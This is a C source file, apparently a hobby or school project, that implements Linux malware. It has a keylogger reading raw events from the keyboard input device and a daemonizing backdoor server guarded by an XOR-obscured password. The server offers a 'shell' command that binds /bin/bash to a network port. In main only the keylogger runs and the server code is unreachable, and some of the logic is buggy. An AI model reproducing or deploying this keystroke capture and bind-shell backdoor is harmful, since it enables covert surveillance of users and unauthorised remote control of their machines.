#include <fcntl.h>
#include <netdb.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#ifndef PORT
 #define PORT 4242
#endif

#define EV_BUF_SIZE 1

void keylogger()
{
	int fd, sz;
    unsigned i;

    unsigned version;
    unsigned short id[4];                 
    char name[256] = "N/A";
	struct input_event ev[EV_BUF_SIZE];

	if ((fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY)) < 0) 
		return;
	ioctl(fd, EVIOCGVERSION, &version);
    ioctl(fd, EVIOCGID, id); 
    ioctl(fd, EVIOCGNAME(sizeof(name)), name);

	for (;;) {
        sz = read(fd, ev, sizeof(struct input_event) * EV_BUF_SIZE);

        for (i = 0; i < sz / sizeof(struct input_event); ++i) {
   /*         fprintf(stdout,
                "%ld.%06ld: "
                "type=%02x "
                "code=%02x "
                "value=%02x\n",
                ev[i].time.tv_sec,
                ev[i].time.tv_usec,
                ev[i].type,
                ev[i].code,
                ev[i].value
            );*/
        }
		if (ev[i].type == 4 && ev[i].code == 4)
		{
			printf("%d ", ev[i].code);
		}
    }

fine:
    close(fd);

}


int net_init()
{
	int fd;
	struct sockaddr_in addr;
	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		return (-1);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(PORT);

	if (bind(fd, (const struct sockaddr *)&addr, sizeof(addr)) == -1)
		return (-1);
	if (fcntl(fd, F_SETFL, O_NONBLOCK) == -1)
		return (-1);
	if (listen(fd, 3) == -1)
		return (-1);
	return fd;
}

typedef struct	s_client
{
	int fd;
	int is_auth; // 0 no 1 yes
	int is_connected;// 0 available 1 busy
	char *wbuf;
	int shellport;
}				t_client;

t_client *find_cl_available(t_client *cl)
{
	for (int i = 0 ; i < 3; i++)
		if (!cl[i].is_connected)
			return (&cl[i]);
	return NULL;
}

t_client *find_cl(t_client *cl, int fd)
{
	for (int i = 0 ; i < 3; i++)
		if (cl[i].fd == fd)
			return (&cl[i]);
	return NULL;
}
int net_accept(t_client *cl, int serv_fd)
{
	struct sockaddr_in cl_addr;
	int cl_fd;
	int len = sizeof(cl_addr);
	if (!cl)
		return (-2);
	if ((cl_fd = accept(serv_fd, (struct sockaddr *)&cl_addr, &len)) < 0)
		return (-3);
	if ((fcntl(cl_fd, F_SETFL, O_NONBLOCK)) == -1)
		return (-4);
	cl->is_connected = 1;
	cl->fd = cl_fd;
	return cl_fd;

}

char *gen_pwd(char *pwd)
{
	char *key= "WEAKPWD!";
	for (int i = 0; i < 9; i++)
		pwd[i] ^= key[i];
	pwd[9] = 0;
	return pwd;
}

void pop_shell(int port, t_client *cls)
{
	pid_t pid;
   

	//exec shell
	if ((pid = fork()) < 0)
		return;
	if (!pid)
	{
		for (int i = 0; i < 3; i++)
			if(cls[i].fd)
				close(cls[i].fd);
		int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;
    // network
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1)
		exit(0);
	servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(port);
    if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0)
		exit(0);
	if ((listen(sockfd, 2)) != 0)
		exit(0);
	len = sizeof(cli);
	connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
	if (connfd < 0)
		exit(0);
    char * const argv[] = {"/bin/bash", NULL};
    char * const envp[] = {NULL};

		dup2(connfd, 0);
		dup2(connfd, 1);
		dup2(connfd, 2);
		execve("/bin/bash", argv, envp);
		exit(0);
	}


}

int net_receive(t_client *cl, fd_set *socks, int *n_cl, t_client *cls)
{
	char buff[1919];
	char pwd[10] = "bvpf=duB\n";
	bzero(buff, sizeof(buff));
	int ret;
	ret = recv(cl->fd, buff, sizeof(buff) - 1, 0);
	if (ret == 0 || ret == -1)
		return (1);
	buff[ret] = 0;
	if (!cl->is_auth && !strcmp(buff, gen_pwd(pwd)))
		cl->is_auth = 1;
	else if (!cl->is_auth)
	{
		cl->wbuf = strdup("Keycode: ");
		return (2);
	}
	else if (!strcmp(buff, "exit\n"))
	{
		close(cl->fd);
		FD_CLR(cl->fd, socks);
		bzero(cl, sizeof(t_client) );
		(*n_cl)--;
	}
	else if (!strcmp(buff, "help\n"))
	{
		cl->wbuf = strdup("help: display available cmds\nshell: pop a shell on another port\nexit: quit this shell\n");
		return(2);
	}
	else if (!strcmp(buff, "shell\n"))
	{
		pop_shell(cl->shellport, cls);
		close(cl->fd);
		FD_CLR(cl->fd, socks);
		bzero(cl, sizeof(t_client));
		(*n_cl)--;
	}
	return (0);
}

void daemonize()
{
   pid_t pid;

    /* Fork off the parent process */
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* On success: The child process becomes session leader */
    if (setsid() < 0)
        exit(EXIT_FAILURE);


    /* Fork off for the second time*/
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);


    /* Change the working directory to the root directory */
    /* or another appropriated directory */
    chdir("/");

	close(0);
	close(1);
	close(2);
}

int main()
{
	//daemonize();
	keylogger();
	return(0);
	int n_clients = 0;
	t_client clients[3];
	fd_set sockets, ready_sockets;
	fd_set wsockets, ready_wsockets;
	int serv_sock;
	int max_fd = 0;

	FD_ZERO(&sockets);
	FD_ZERO(&wsockets);

	bzero(clients, sizeof(t_client) * 3);
	clients[0].shellport = 4243;
	clients[1].shellport = 4244;
	clients[2].shellport = 4245;
	if ((serv_sock = net_init()) < 0)
		return 1;
	FD_SET(serv_sock, &sockets);
	max_fd = serv_sock;

	while (19)
	{
		ready_sockets = sockets;
		ready_wsockets = wsockets;
		if (select(max_fd + 1, &ready_sockets, &ready_wsockets, NULL, NULL) == -1)
			return (1);
		for (int i = 0; i <= max_fd; i++)
		{
		clients[0].shellport = 4243;
		clients[1].shellport = 4244;
		clients[2].shellport = 4245;
			if (FD_ISSET(i, &wsockets))
			{
				t_client *cl = find_cl(clients, i);
				send(cl->fd, cl->wbuf, strlen(cl->wbuf), 0);
				free(cl->wbuf);
				cl->wbuf = 0;
				FD_CLR(i, &wsockets);
			}
			if (FD_ISSET(i, &ready_sockets))//Socket ready for read operations
			{
				if (i == serv_sock && n_clients < 3)
				{
					int clfd;
					if ((clfd = net_accept(find_cl_available(clients), serv_sock)) < 0)
						continue;
					FD_SET(clfd, &sockets);
					n_clients++;
					if (clfd > max_fd);
						max_fd = clfd;
					FD_SET(clfd, &wsockets);
					find_cl(clients, clfd)->wbuf = strdup("Keycode: ");
				}
				else if (i != serv_sock)
				{
					int r = net_receive(find_cl(clients, i), &sockets, &n_clients, clients);
					if (r == 1) //end of com
					{
						close(i);
						FD_CLR(i, &sockets);
						bzero(find_cl(clients, i), sizeof(t_client));
						n_clients--;
					}
					if (r == 2)
						FD_SET(i, &wsockets);
				}
			}
		}
	}
}